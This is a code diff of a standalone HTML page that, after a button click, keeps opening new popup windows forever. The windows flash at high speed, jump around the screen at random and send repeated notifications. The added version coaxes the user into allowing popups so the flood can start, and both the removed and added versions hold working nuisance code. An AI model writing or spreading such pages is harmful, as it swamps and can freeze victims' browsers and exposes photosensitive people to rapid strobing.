@@ -1,73 +1,76 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>MASTER_REPLICATOR_V3</title>
-    <link id="icon" rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='white'/></svg>">
+    <title>MASTER_CONTROL</title>
     <style>
-        body { background: #000; color: #fff; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
-        .box { border: 2px solid #fff; padding: 50px; box-shadow: 0 0 20px #fff; }
-        button { padding: 20px 40px; background: #fff; border: none; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
-        button:hover { background: red; color: #fff; }
+        body { 
+            background: #000; color: #00ff00; font-family: 'Courier New', monospace; 
+            display: flex; flex-direction: column; align-items: center; justify-content: center; 
+            height: 100vh; margin: 0; 
+        }
+        #status { margin-bottom: 20px; font-size: 1.2rem; color: red; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+        
+        .btn { 
+            padding: 30px 60px; font-size: 2rem; background: #00ff00; color: #000; 
+            border: none; cursor: pointer; font-weight: bold; box-shadow: 0 0 20px #00ff00;
+        }
+        .btn:active { transform: scale(0.95); background: #fff; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1>SYSTEM READY</h1>
-        <p>NO EXTERNAL FILES NEEDED</p>
-        <button onclick="ignite()">EXECUTE ALL-IN-ONE</button>
-    </div>
+
+    <div id="status">! POP-UPS MUST BE ENABLED !</div>
+    <button class="btn" onclick="ignite()">ACTIVATE</button>
 
     <script>
-        // This is your entire 'notifacations.html' converted into a "Data URL"
-        const glitchContent = `
-            <html>
-            <head>
-                <title>GLITCH_UNIT</title>
-                <style>
-                    body { background: #000; margin: 0; overflow: hidden; height: 100vh; width: 100vw; }
-                    #box { position: fixed; width: 100%; height: 100%; background: #fff; animation: pulse 0.05s infinite; }
-                    @keyframes pulse {
-                        0% { background: #fff; clip-path: inset(0 0 0 0); }
-                        50% { background: #000; clip-path: polygon(10% 0, 90% 0, 100% 100%, 0% 100%); }
-                        100% { background: #444; clip-path: polygon(50% 0, 100% 50%, 50% 100%, 0 50%); }
-                    }
-                    button { position: fixed; z-index: 99; top: 50%; left: 50%; transform: translate(-50%,-50%); padding: 20px; cursor: pointer; }
-                </style>
-            </head>
-            <body onload="setInterval(() => { window.moveTo(Math.random()*screen.width, Math.random()*screen.height); }, 500)">
-                <div id="box"></div>
-                <button onclick="start()">ACTIVATE NOTIFS</button>
-                <script>
-                    const words = ["VOID", "NULL", "ERROR", "SIGNAL", "BREACH", "FATAL", "DATA", "LOST"];
-                    async function start() {
-                        this.remove();
-                        const p = await Notification.requestPermission();
-                        if (p === 'granted') {
-                            setInterval(() => {
-                                let m = ""; for(let i=0; i<5; i++) m += words[Math.floor(Math.random()*words.length)] + " ";
-                                new Notification("!", { body: m.trim(), silent: true });
-                            }, 1000);
-                        }
-                    }
-                <\/script>
-            </body>
-            </html>
-        `;
-
         function ignite() {
-            // 1. Icon Glitch
-            setInterval(() => {
-                const p = () => Math.floor(Math.random() * 100);
-                document.getElementById('icon').href = `data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><polygon points='${p()},${p()} ${p()},${p()} ${p()},${p()}' fill='white'/></svg>`;
-            }, 60);
+            console.log("Attempting to launch...");
+            
+            // 1. Open ONE window immediately to trigger the "Allow Popups" prompt
+            const testWin = window.open("", "_blank", "width=100,height=100");
+            if (!testWin || testWin.closed || typeof testWin.closed == 'undefined') {
+                alert("BROWSER BLOCKED US! Click the red 'X' icon in your URL bar and select 'Always Allow', then click ACTIVATE again.");
+                return;
+            }
 
-            // 2. Spawn windows using the embedded code
+            // 2. If we have permission, start the chaos
+            document.querySelector('.btn').innerHTML = "RUNNING...";
+            
             setInterval(() => {
-                const x = Math.random() * screen.width;
-                const y = Math.random() * screen.height;
-                const win = window.open("", "_blank", \`width=400,height=400,left=\${x},top=\${y}\`);
-                win.document.write(glitchContent);
-            }, 500);
+                const x = Math.floor(Math.random() * window.screen.availWidth);
+                const y = Math.floor(Math.random() * window.screen.availHeight);
+                
+                // We create the window content on the fly
+                const win = window.open("", "_blank", `width=300,height=300,left=${x},top=${y}`);
+                
+                if(win) {
+                    win.document.write(`
+                        <title>GLITCH</title>
+                        <body style="background:white; animation: f 0.05s infinite;">
+                            <style>
+                                @keyframes f { 0%{background:#fff} 50%{background:#000} }
+                            </style>
+                            <h2 style="font-family:sans-serif; text-align:center;">VOID</h2>
+                            <script>
+                                // Auto-move the window
+                                setInterval(() => {
+                                    window.moveTo(Math.random()*screen.width, Math.random()*screen.height);
+                                }, 300);
+                                
+                                // Notification spam
+                                Notification.requestPermission().then(p => {
+                                    if(p==='granted') {
+                                        setInterval(() => {
+                                            new Notification("ERROR", { body: "SIGNAL LOST", silent: true });
+                                        }, 1000);
+                                    }
+                                });
+                            <\/script>
+                        </body>
+                    `);
+                }
+            }, 600); // 0.6 seconds between windows so it doesn't freeze you immediately
         }
     </script>
 </body>
